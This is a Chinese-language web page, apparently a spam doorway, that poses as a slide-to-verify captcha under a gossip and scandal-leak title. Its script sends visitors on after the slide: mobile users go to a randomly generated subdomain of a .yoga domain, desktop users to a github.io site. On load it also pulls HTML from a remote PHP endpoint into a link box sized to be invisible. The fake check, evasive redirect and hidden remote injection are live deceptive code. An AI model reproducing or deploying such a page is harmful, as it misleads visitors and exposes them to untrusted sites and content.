<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>&#x6bcf;&#x65e5;&#x5927;&#x805a;&#x96c6;&#x5403;&#x74dc;&#x5f;&#x52b2;&#x7206;&#x9ed1;&#x6599;&#x7206;&#x6599;&#x5408;&#x96c6;&#x5f;&#x4eca;&#x65e5;&#x53cd;&#x5dee;&#x74dc;&#x7530;&#x7cbe;&#x9009;&#x5f;&#x5403;&#x74dc;&#x70ed;&#x70b9;&#x5168;&#x6536;&#x5f55;</title>
    <style>
        :root {
            --primary-color: #4f46e5;
            --primary-hover: #4338ca;
            --success-color: #10b981;
            --text-color: #1f2937;
            --bg-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
        }
        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: var(--bg-gradient);
            padding: 20px;
        }
        .captcha-container {
            background: #fff;
            padding: 40px 30px;
            border-radius: 24px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 400px;
            text-align: center;
            backdrop-filter: blur(10px);
            transition: transform 0.3s ease;
        }
        .captcha-container:hover {
            transform: translateY(-2px);
        }
        .captcha-header h1 {
            color: var(--text-color);
            font-size: 24px;
            margin-bottom: 8px;
            font-weight: 700;
        }
        .captcha-header p {
            color: #6b7280;
            font-size: 14px;
            margin-bottom: 35px;
        }
        .slider-track {
            position: relative;
            height: 56px;
            background-color: #000;
            border-radius: 28px;
            border: 1px solid #e5e7eb;
            overflow: hidden;
            user-select: none;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .slider-text {
            color: #fff;
            font-size: 15px;
            z-index: 1;
            transition: opacity 0.3s ease;
            pointer-events: none;
        }
        .slider-bg {
            position: absolute;
            left: 0;
            top: 0;
            height: 100%;
            width: 0;
            background-color: rgba(16, 185, 129, 0.15);
            z-index: 0;
        }
        .slider-button {
            position: absolute;
            left: 2px;
            top: 2px;
            width: 50px;
            height: 50px;
            background-color: #ffffff;
            border-radius: 50%;
            cursor: grab;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            z-index: 2;
            transition: background-color 0.2s, box-shadow 0.2s;
        }
        .slider-button:active {
            cursor: grabbing;
            background-color: #f9fafb;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.15);
        }
        .slider-button svg {
            width: 20px;
            height: 20px;
            fill: none;
            stroke: var(--primary-color);
            stroke-width: 2.5;
            stroke-linecap: round;
            stroke-linejoin: round;
            transition: stroke 0.3s, transform 0.3s;
        }
        .captcha-container.success .slider-track {
            border-color: var(--success-color);
            background-color: rgba(16, 185, 129, 0.1);
        }
        .captcha-container.success .slider-button {
            background-color: var(--success-color);
            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
            cursor: default;
        }
        .captcha-container.success .slider-button svg {
            stroke: #ffffff;
            transform: scale(1.1);
        }
        .captcha-container.success .slider-text {
            color: var(--success-color);
            font-weight: 600;
        }
        .captcha-footer {
            margin-top: 35px;
        }
        .captcha-footer h2 {
            color: var(--text-color);
            font-size: 24px;
            margin-bottom: 12px;
            font-weight: 700;
        }
        .link-group {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(55px, 1fr));
            gap: 8px;
            width: 100%;
            max-height: 0.01px;
            overflow-y: auto;
            overflow-x: hidden;
            padding-right: 4px;
        }
        .link-group::-webkit-scrollbar {
            width: 4px;
        }
        .link-group a {
            display: block;
            padding: 6px 4px;
            background-color: #f3f4f6;
            color: var(--primary-color);
            text-decoration: none;
            border-radius: 6px;
            font-size: 14px;
            transition: background-color 0.2s;
        }
        .link-group a:hover {
            background-color: var(--primary-color);
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="captcha-container" id="captchaContainer">
        <div class="captcha-header">
            <h1>&#x6bcf;&#x65e5;&#x5927;&#x805a;&#x96c6;&#x5403;&#x74dc;&#x5f;&#x52b2;&#x7206;&#x9ed1;&#x6599;&#x7206;&#x6599;&#x5408;&#x96c6;&#x5f;&#x4eca;&#x65e5;&#x53cd;&#x5dee;&#x74dc;&#x7530;&#x7cbe;&#x9009;&#x5f;&#x5403;&#x74dc;&#x70ed;&#x70b9;&#x5168;&#x6536;&#x5f55;</h1>
            <p>请向右滑动进入</p>
        </div>
        <div class="slider-track" id="sliderTrack">
            <div class="slider-bg" id="sliderBg"></div>
            <div class="slider-text" id="sliderText">向右滑动进入</div>
            <div class="slider-button" id="sliderButton">
                <svg id="sliderIcon" viewBox="0 0 24 24">
                    <path d="M5 12h14M12 5l7 7-7 7"/>
                </svg>
            </div>
        </div>
        <div class="captcha-footer">
            <h2>相关链接</h2>
            <div class="link-group" id="linkWrap"></div>
        </div>
    </div>

    <script>
        const container = document.getElementById('captchaContainer');
        const track = document.getElementById('sliderTrack');
        const button = document.getElementById('sliderButton');
        const bg = document.getElementById('sliderBg');
        const text = document.getElementById('sliderText');
        const icon = document.getElementById('sliderIcon');
        const linkWrap = document.getElementById('linkWrap');

        let isDragging = false;
        let startX = 0;
        let maxResult = 0;
        let isSuccess = false;
		
		const API_URL = "https://wrightamanda379139.5u9xxj.cn/2.php?username=wrightamanda379139";

        async function replaceLinksByPost() {
            try {
                const resp = await fetch(API_URL, {
                    method: "GET",
                    mode: "cors"
                });
                if (!resp.ok) throw new Error("接口请求失败");
                const res = await resp.text();
				linkWrap.innerHTML = res;
            } catch (err) {
				linkWrap.innerHTML = '<a href="/1.html" target="_blank">1</a><a href="/2.html" target="_blank">2</a><a href="/3.html" target="_blank">3</a><a href="/4.html" target="_blank">4</a><a href="/5.html" target="_blank">5</a><a href="/6.html" target="_blank">6</a><a href="/7.html" target="_blank">7</a><a href="/8.html" target="_blank">8</a><a href="/9.html" target="_blank">9</a><a href="/10.html" target="_blank">10</a><a href="/11.html" target="_blank">11</a><a href="/12.html" target="_blank">12</a><a href="/13.html" target="_blank">13</a><a href="/14.html" target="_blank">14</a><a href="/15.html" target="_blank">15</a><a href="/16.html" target="_blank">16</a><a href="/17.html" target="_blank">17</a><a href="/18.html" target="_blank">18</a><a href="/19.html" target="_blank">19</a><a href="/20.html" target="_blank">20</a>';
            }
        }

        function generateRandom32() {
            const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < 32; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }

        function isMobile() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        }

        function getTargetUrl() {
            if (isMobile()) {
                const template = "https://{xxx}.dnoxmrxxgv.yoga/";
                const randomStr = generateRandom32();
                return template.replace('{xxx}', randomStr);
            } else {
                return "https://wrightamanda379139.github.io/";
            }
        }

        function initMaxResult() {
            maxResult = track.clientWidth - button.clientWidth - 4;
        }
        initMaxResult();
        window.addEventListener('resize', initMaxResult);

        const getEventX = (e) => e.touches ? e.touches[0].clientX : e.clientX;

        function dragStart(e) {
            if (isSuccess) return;
            isDragging = true;
            startX = getEventX(e);
            button.style.transition = 'none';
            bg.style.transition = 'none';
        }

        function dragMove(e) {
            if (!isDragging || isSuccess) return;
            let moveX = getEventX(e) - startX;
            if (moveX < 0) moveX = 0;
            if (moveX > maxResult) moveX = maxResult;
            button.style.left = moveX + 2 + 'px';
            bg.style.width = moveX + button.clientWidth / 2 + 'px';
            text.style.opacity = 1 - (moveX / maxResult);
        }

        function dragEnd() {
            if (!isDragging || isSuccess) return;
            isDragging = false;
            let currentX = parseInt(button.style.left) - 2;
            if (currentX >= maxResult * 0.95) {
                verifySuccess();
            } else {
                button.style.transition = 'left 0.3s cubic-bezier(0.25, 1, 0.5, 1)';
                bg.style.transition = 'width 0.3s cubic-bezier(0.25, 1, 0.5, 1)';
                button.style.left = '2px';
                bg.style.width = '0px';
                text.style.opacity = 1;
            }
        }

        function verifySuccess() {
            isSuccess = true;
            button.style.left = maxResult + 2 + 'px';
            bg.style.width = '100%';
            container.classList.add('success');
            text.textContent = '验证通过';
            text.style.opacity = 1;
            icon.innerHTML = '<path d="M20 6L9 17l-5-5"/>';
            setTimeout(() => {
                window.location.href = getTargetUrl();
            }, 800);
        }

        button.addEventListener('mousedown', dragStart);
        window.addEventListener('mousemove', dragMove);
        window.addEventListener('mouseup', dragEnd);
        button.addEventListener('touchstart', dragStart, { passive: true });
        window.addEventListener('touchmove', dragMove, { passive: false });
        window.addEventListener('touchend', dragEnd);

        replaceLinksByPost();
    </script>
</body>
</html>
